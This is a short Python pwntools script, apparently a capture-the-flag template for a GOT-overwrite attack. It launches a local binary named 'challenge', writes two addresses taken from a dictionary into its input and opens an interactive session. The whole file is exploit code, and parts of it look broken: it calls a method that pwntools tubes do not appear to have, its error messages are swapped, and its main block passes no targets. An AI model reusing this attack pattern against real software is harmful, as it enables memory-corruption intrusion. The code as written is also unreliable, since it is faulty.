# Import statements
from pwn import *


def gotattack(execute_command = None,filename = "challenge",address_dictionary = {},what_function= None,where_function = None):

    '''
    Perform gotattack

    :param str execute_command: The command to be executed or None
    :param filename: The name of file to be executed or None
    :param address_dictionary: The dictionary containing information name of function and address
    :param what_function: The function which is be executed before or None
    :param where_function: The function which is to be executed after or None
    :return:
    '''

    # The target binary is 64-bit.
    # While we can explicitly specify the architecture and other things
    # in the context settings, we can also absorb them from the file.
    if not execute_command:
        if filename:
            execute_command = "./" + filename
            context.binary = execute_command
        else:
            context.binary = './challenge'

    # Create an instance of the process to talk to
    io = process(context.binary.path)

    if what_function and where_function:
        what = address_dictionary[what_function]
        where = address_dictionary[where_function]
        io.pack(where)
        io.pack(what)
        io.interactive()
    elif what_function:
        print("Missing what !")
    else:
        print("Missing where !")


if __name__ == "__main__":
    gotattack(execute_command=None,filename="challenge",address_dictionary={},what_function=None,where_function=None)